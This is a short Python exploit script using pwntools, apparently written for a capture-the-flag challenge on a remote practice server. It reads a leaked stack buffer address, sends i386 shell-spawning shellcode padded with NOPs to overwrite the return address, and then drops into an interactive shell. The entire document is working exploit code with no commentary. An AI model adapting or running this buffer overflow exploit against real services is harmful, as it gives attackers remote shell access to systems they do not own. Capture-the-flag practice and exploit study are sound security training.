from pwn import *

p = remote('ctf.j0n9hyun.xyz', 3006)

context.arch = 'i386'
shellcode = asm(shellcraft.sh())

p.sendlineafter('Data : ', 'AAAA')
buf = int(p.recvuntil(':')[:-1],16)

p.sendlineafter('(y/n)', 'y')

payload = ''
payload += shellcode
payload += '\x90'*(136-len(shellcode)+4)
payload += p32(buf)

p.sendlineafter('Data : ', payload)
p.interactive()
